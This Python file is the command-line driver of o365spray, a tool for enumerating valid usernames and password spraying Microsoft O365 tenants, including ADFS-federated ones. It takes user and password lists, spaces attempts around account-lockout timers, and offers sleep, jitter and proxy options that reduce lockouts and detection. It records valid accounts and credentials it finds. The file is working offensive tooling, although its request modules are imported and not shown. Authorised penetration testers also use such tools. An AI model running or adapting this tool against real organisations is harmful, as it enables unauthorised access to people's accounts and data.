#!/usr/bin/env python3

import os
import sys
import time
import signal
import logging
import asyncio
import argparse
from random import randint
from pathlib import Path

from o365spray import __version__
from o365spray.core import (  # type: ignore
    Defaults,
    Sprayer,
    Enumerator,
    Validator,
    Helper,
    text_colors,
)

HELPER = Helper()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "o365spray | Microsoft O365 User Enumerator and Password Sprayer"
            f" -- v{__version__}"
        )
    )

    parser.add_argument(
        "-d",
        "--domain",
        type=str,
        help=(
            "Target domain for validation, user enumeration, "
            "and/or password spraying."
        ),
    )

    # Type of action(s) to run
    parser.add_argument(
        "--validate", action="store_true", help="Run domain validation only."
    )
    parser.add_argument(  # Can be used with --spray
        "--enum", action="store_true", help="Run username enumeration."
    )
    parser.add_argument(  # Can be used with --enum
        "--spray", action="store_true", help="Run password spraying."
    )

    # Username(s)/Password(s) for enum/spray
    parser.add_argument(
        "-u", "--username", type=str, help="Username(s) delimited using commas."
    )
    parser.add_argument(
        "-p", "--password", type=str, help="Password(s) delimited using commas."
    )
    parser.add_argument(
        "-U", "--userfile", type=str, help="File containing list of usernames."
    )
    parser.add_argument(
        "-P", "--passfile", type=str, help="File containing list of passwords."
    )
    parser.add_argument(
        "--paired",
        type=str,
        help="File containing list of credentials in username:password format.",
    )

    # Password spraying lockout policy
    parser.add_argument(
        "-c",
        "--count",
        type=int,
        default=1,
        help=(
            "Number of password attempts to run per user before resetting the "
            "lockout account timer. Default: 1"
        ),
    )
    parser.add_argument(
        "-l",
        "--lockout",
        type=float,
        default=15.0,
        help="Lockout policy's reset time (in minutes). Default: 15 minutes",
    )

    # Spray/Enum action specifications
    parser.add_argument(
        "--enum-module",
        type=str.lower,
        default="office",
        choices=("office", "onedrive", "oauth2"),
        help="Specify which enumeration module to run. Default: office",
    )
    parser.add_argument(
        "--spray-module",
        type=str.lower,
        default="oauth2",
        choices=("oauth2", "activesync", "autodiscover", "reporting", "adfs"),
        help="Specify which password spraying module to run. Default: oauth2",
    )
    parser.add_argument(
        "--adfs-url",
        type=str,
        help="AuthURL of the target domain's ADFS login page for password spraying.",
    )

    # General scan specifications
    parser.add_argument(
        "--sleep",
        type=int,
        default=0,
        choices=range(-1, 121),
        metavar="[-1, 0-120]",
        help=(
            "Throttle HTTP requests every `N` seconds. This can be randomized by "
            "passing the value `-1` (between 1 sec and 2 mins). Default: 0"
        ),
    )
    parser.add_argument(
        "--jitter",
        type=int,
        default=0,
        choices=range(0, 101),
        metavar="[0-100]",
        help="Jitter extends --sleep period by percentage given (0-100). Default: 0",
    )
    parser.add_argument(
        "--rate",
        type=int,
        default=10,
        help=(
            "Number of concurrent connections (attempts) during enumeration and "
            "spraying. Default: 10"
        ),
    )
    # Note: This is currently only applicable to the `oauth2` spray module
    parser.add_argument(
        "--safe",
        type=int,
        default=10,
        help=(
            "Terminate password spraying run if `N` locked accounts are observed. "
            "Default: 10"
        ),
    )

    # HTTP configurations
    parser.add_argument(
        "--timeout",
        type=int,
        default=25,
        help="HTTP request timeout in seconds. Default: 25",
    )
    parser.add_argument(
        "--proxy",
        type=str,
        help="HTTP/S proxy to pass traffic through (e.g. http://127.0.0.1:8080).",
    )

    # Misc configurations
    parser.add_argument(
        "--output",
        type=str,
        help=(
            "Output directory for results and test case files. "
            "Default: current directory"
        ),
    )
    parser.add_argument(
        "-v", "--version", action="store_true", help="Print the tool version."
    )
    parser.add_argument("--debug", action="store_true", help="Enable debug output.")
    args = parser.parse_args()

    # If no flags provided, print the tool help and exit
    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(0)

    # Print the tool version and exit
    if args.version:
        print(f"o365spray -- {__version__}")
        sys.exit(0)

    # If not getting the tool version and flags have been provided, ensure
    # all required flags and valid flag combinations are present

    # Ensure a domain has been provided
    if not args.domain:
        parser.error("-d/--domain is required.")

    # If running user enumeration, make sure we have a username or username file
    if args.enum and (not args.username and not args.userfile):
        parser.error(
            "-u/--username or -U/--userfile is required when performing user "
            "enumeration via --enum."
        )

    # If running password spraying, make sure we have both username(s) and
    # password(s)
    if args.spray and (
        (
            (not args.username and not args.userfile)  # No username(s)
            or (not args.password and not args.passfile)  # No password(s)
        )
        and not args.paired  # Covers both username(s) and password(s)
    ):
        parser.error(
            "When running password spraying via --spray, the following flags are required: "
            "(-u/--username or -U/--userfile) and (-p/--password or -P/--passfile) -> "
            "otherwise, --paired is required."
        )

    # Handle sleep randomization
    if args.sleep == -1:
        args.sleep = randint(1, 120)

    return args


def validate(args: argparse.Namespace) -> argparse.Namespace:
    """
    Validate a given domain is hosted by O365 and check if it is
    a Managed or Federated realm.
    """
    logging.info(f"Running O365 validation for: {args.domain}")

    # Note: For now, this will default to the 'getuserrealm' module as that
    #       is the only implemented module
    v = Validator(
        timeout=args.timeout,
        proxy=args.proxy,
        sleep=args.sleep,
        jitter=args.jitter,
    )
    (valid, adfs) = v.validate(args.domain)

    # If the domain is invalid, notify the user, disable enum and spray
    # and return the args namespace
    if not valid:
        logging.info(
            f"[{text_colors.red}FAILED{text_colors.reset}] "
            f"The following domain is not using O365: {args.domain}"
        )
        (args.enum, args.spray) = (False, False)
        return args

    # Notify the user of the results
    if adfs:
        logging.info(
            f"[{text_colors.yellow}WARNING{text_colors.reset}] "
            f"The following domain is using O365, but is Federated: {args.domain}"
            f"\n\t[!] --> ADFS AuthURL: {adfs}"
        )
    else:
        logging.info(
            f"[{text_colors.green}VALID{text_colors.reset}] "
            f"The following domain is using O365: {args.domain}"
        )

    # If we are only validating, disable enum and spray and return the
    # args namespace
    if args.validate:
        (args.enum, args.spray) = (False, False)
        return args

    # If we are in a Federated realm, ask the user if they want to update
    # their enum/spray options
    if adfs:

        # Update the ADFS AuthURL parameter as the URL provided by Microsoft's
        # `getuserrealm`
        args.adfs_url = adfs

        # OneDrive is currently the only valid method for ADFS enumeration -
        # prompt the user to ask if they would like to switch if not already
        # set
        if args.enum and (
            args.enum_module != "onedrive" and args.enum_module != "oauth2"
        ):
            logging.info("\n")  # Blank line
            prompt = (
                "[ ? ]\tSwitch to the oAuth2 module for user enumeration against a "
                "Federated Realm [Y/n] "
            )
            resp = HELPER.prompt_question(prompt)
            if resp[0] == "y":
                args.enum_module = "oauth2"
            else:
                # Disable enumeration as all other modules currently return False
                # Positives for ADFS
                logging.info("Disabling user enumeration against Federated Realm.")
                args.enum = False

        # If the user has specified to perform password spraying - prompt
        # the user to ask if they would like to target ADFS or continue
        # targeting Microsoft API's
        # Note: The oAuth2 module will work for federated realms ONLY when
        #       the target has enabled password synchronization - otherwise
        #       authentication will always fail
        if args.spray and (
            args.spray_module != "adfs" and args.spray_module != "oauth2"
        ):
            logging.info("\n")  # Blank line
            prompt = "[ ? ]\tSwitch to the ADFS module for password spraying [Y/n] "
            resp = HELPER.prompt_question(prompt)
            if resp[0] == "y":
                args.spray_module = "adfs"

    return args


def enumerate(args: argparse.Namespace, output_dir: str) -> Enumerator:
    """Run user enumeration against a given domain.

    Arguments:
        args: namespace containing command line arguments
        output_dir: name of output directory to write results to

    Returns:
        initialized Enumerator instance

    Raises:
        KeyboardInterrupt: generic catch so that our signal handler
          can do its job
    """
    # Create enum directory
    output_directory = f"{output_dir}/enum/"
    Path(output_directory).mkdir(parents=True, exist_ok=True)

    loop = asyncio.get_event_loop()

    # Support both username(s) and a username file being provided
    password = "Password1" if not args.password else args.password.split(",")[0]
    userlist = []
    if args.username:
        userlist += args.username.split(",")
    if args.userfile:
        userlist += HELPER.get_list_from_file(args.userfile)

    logging.info(f"Running user enumeration against {len(userlist)} potential users")

    enum = Enumerator(
        loop,
        output_dir=output_directory,
        timeout=args.timeout,
        proxy=args.proxy,
        workers=args.rate,
        writer=True,
        sleep=args.sleep,
        jitter=args.jitter,
    )

    def enum_signal_handler(signal, frame):
        """Signal handler for Enum routines.

        Arguments:
            signal: called signal
            frame: stack frame
        """
        enum.shutdown(key=True)
        print(Defaults.ERASE_LINE, end="\r")
        logging.info("\n")  # Blank line
        logging.info("Valid Accounts: %d" % len(enum.VALID_ACCOUNTS))
        sys.exit(0)

    # Add signal handler to handle ctrl-c interrupts
    signal.signal(signal.SIGINT, enum_signal_handler)
    signal.signal(signal.SIGTERM, enum_signal_handler)

    try:
        loop.run_until_complete(
            enum.run(
                userlist,
                password=password,
                domain=args.domain,
                module=args.enum_module,
            )
        )

        # Gracefully shutdown if it triggered internally
        if not enum.exit:
            enum.shutdown()
        logging.info("Valid Accounts: %d" % len(enum.VALID_ACCOUNTS))

        loop.run_until_complete(asyncio.sleep(0.250))
        loop.close()

    except KeyboardInterrupt:
        pass

    return enum


def spray(args: argparse.Namespace, output_dir: str, enum: Enumerator):
    """Run a password spray against a given domain.

    Arguments:
        args: namespace containing command line arguments
        output_dir: name of output directory to write results to

    Raises:
        KeyboardInterrupt: generic catch so that our signal handler
          can do its job
    """
    # Create spray directory
    output_directory = f"{output_dir}/spray/"
    Path(output_directory).mkdir(parents=True, exist_ok=True)

    loop = asyncio.get_event_loop()

    # Support both password(s) and a password file being provided
    passlist = []
    if args.password:
        passlist += args.password.split(",")
    if args.passfile:
        passlist += HELPER.get_list_from_file(args.passfile)

    # Use validated users if enumeration was run
    if args.enum:
        userlist = enum.VALID_ACCOUNTS
        # Sleep before spraying when enumeration that uses authentication
        # was used
        if args.enum_module in ["activesync", "oauth2"]:
            logging.info(
                "User enumeration using authentication was run. "
                "Resetting lockout before password spraying."
            )
            logging.info("Sleeping for %.1f minutes" % (args.lockout))
            HELPER.lockout_reset_wait(args.lockout)

    # Handle username:password files
    elif args.paired:
        paired_dict = HELPER.get_paired_dict_from_file(args.paired)
        paired_max_pass = HELPER.get_max_dict_elem(paired_dict)
        # Default this to None as we will pass a custom userlist
        # on each spray rotation
        userlist = [None]

    else:
        # Support both username(s) and a username file being provided
        userlist = []
        if args.username:
            userlist += args.username.split(",")
        if args.userfile:
            userlist += HELPER.get_list_from_file(args.userfile)

    # Validate we have a scope of users to spray
    if len(userlist) < 1:
        logging.error("No users provided to run a password spray against.")
        return

    logging.info("Running password spray against %d users." % len(userlist))

    spray = Sprayer(
        loop=loop,
        module=args.spray_module,
        domain=args.domain,
        userlist=userlist,
        output_dir=output_directory,
        timeout=args.timeout,
        proxy=args.proxy,
        workers=args.rate,
        lock_threshold=args.safe,
        adfs_url=args.adfs_url,
        writer=True,
        sleep=args.sleep,
        jitter=args.jitter,
    )

    def spray_signal_handler(signal, frame):
        """Signal handler for Spray routines.

        Arguments:
            signal: invoked signal
            frame: stack frame
        """
        spray.shutdown(key=True)
        print(Defaults.ERASE_LINE, end="\r")
        logging.info("\n")  # Blank line
        logging.info("Valid Credentials: %d" % (len(spray.VALID_CREDENTIALS)))
        sys.exit(0)

    # Add signal handler to handle ctrl-c interrupts
    signal.signal(signal.SIGINT, spray_signal_handler)
    signal.signal(signal.SIGTERM, spray_signal_handler)

    try:
        if args.paired:
            logging.info("Password spraying using paired usernames:passwords.")

            # Track the current password index
            count = 0

            # Loop over our paired data set until we have reached the end of
            # the longest password list
            while count < paired_max_pass:
                count += 1
                userlist, passlist = [], []

                # Loop over the users in our data set and create a new userlist
                # and passlist each time
                for username, passwords in paired_dict.items():
                    if len(passwords) >= count:
                        userlist.append(username)
                        passlist.append(passwords[count - 1])

                logging.info(f"Password spraying {len(userlist)} paired accounts.")

                loop.run_until_complete(
                    spray.run(
                        password=passlist,
                        userlist=userlist,
                    )
                )

                # Catch exit handler from within spray class
                if spray.exit:
                    break

                # Flush the open files after each rotation
                if spray.writer:
                    spray.valid_writer.flush()
                    spray.tested_writer.flush()

                # Stop if we hit our locked account limit
                # Note: This currently only applies to the oauth2 spraying module as
                #       Autodiscover is currently showing invalid lockouts
                if spray.lockout >= args.safe:
                    logging.error("Locked account threshold reached. Exiting...")
                    spray.shutdown()
                    break

                # Stop if there are no more users to spray
                if not spray.userlist:
                    logging.debug("End of password spraying user list reached.")
                    break

                # Check if we have reached the end of our paired data set
                if count < paired_max_pass:
                    HELPER.lockout_reset_wait(args.lockout)
                else:
                    break

        else:
            for password_chunk in HELPER.get_chunks_from_list(passlist, args.count):
                logging.info(
                    "Password spraying the following passwords: [%s]"
                    % (", ".join("'%s'" % password for password in password_chunk))
                )

                # Loop through each password individually so it's easier to keep track and
                # avoid duplicate scans once a removal condition is hit
                for password in password_chunk:
                    loop.run_until_complete(spray.run(password))

                    # Catch exit handler from within spray class
                    if spray.exit:
                        break

                    # Flush the open files after each rotation
                    if spray.writer:
                        spray.valid_writer.flush()
                        spray.tested_writer.flush()

                    # Stop if we hit our locked account limit
                    # Note: This currently only applies to the oauth2 spraying module as
                    #       Autodiscover is currently showing invalid lockouts
                    if spray.lockout >= args.safe:
                        logging.error("Locked account threshold reached. Exiting...")
                        spray.shutdown()
                        break

                    # Stop if there are no more users to spray
                    if not spray.userlist:
                        logging.debug("End of password spraying user list reached.")
                        break

                # https://stackoverflow.com/a/654002
                # https://docs.python.org/3/tutorial/controlflow.html#break-and-continue-statements-and-else-clauses-on-loops
                # Only executed if the inner loop did NOT break
                else:
                    # Check if we reached the last password chunk
                    if not HELPER.check_last_chunk(password_chunk, passlist):
                        HELPER.lockout_reset_wait(args.lockout)
                    continue

                # Only executed if the inner loop DID break
                break

        # Gracefully shutdown if it triggered internally
        if not spray.exit:
            spray.shutdown()
        logging.info("Valid Credentials: %d" % (len(spray.VALID_CREDENTIALS)))

        loop.run_until_complete(asyncio.sleep(0.250))
        loop.close()

    except KeyboardInterrupt:
        pass


def main():
    """Main entry point for o365spray"""

    # Parse command line arguments
    args = parse_args()

    # Initialize logging level and format
    if args.debug:
        logging_level = logging.DEBUG
        logging_format = (
            "[%(asctime)s] %(levelname)-5s - %(filename)17s:%(lineno)-4s - %(message)s"
        )
    else:
        logging_level = logging.INFO
        logging_format = "[%(asctime)s] %(levelname)-5s: %(message)s"

    logging.basicConfig(format=logging_format, level=logging_level)
    # logging.addLevelName(logging.WARNING, "WARN")

    start = time.time()

    # Print banner with config settings
    HELPER.banner(args, __version__)

    # If an output directory provided, get or create it
    if args.output:
        output_directory = args.output.strip("/")
        Path(output_directory).mkdir(parents=True, exist_ok=True)
    # If no output provided, default to the current working directory
    else:
        output_directory = os.getcwd()

    if args.adfs_url:
        # Skip domain validation and enforce ADFS enumeration/spraying
        # when the user provides an ADFS AuthURL
        if args.enum and args.enum_module != "onedrive":
            logging.info("Switching to OneDrive module for user enumeration")
            args.enum_module = "onedrive"
        if args.spray and args.spray_module != "adfs":
            logging.info("Switching to ADFS module for password spraying")
            args.spray_module = "adfs"

    else:
        # Perform domain validation
        args = validate(args)

    # Perform user enumeration
    if args.enum:
        enum = enumerate(args, output_directory)
    else:
        enum = None

    if args.spray:
        spray(args, output_directory, enum)

    elapsed = time.time() - start
    logging.debug("\n")
    logging.debug(f"{__file__} executed in {elapsed:.2f} seconds.")


if __name__ == "__main__":
    main()
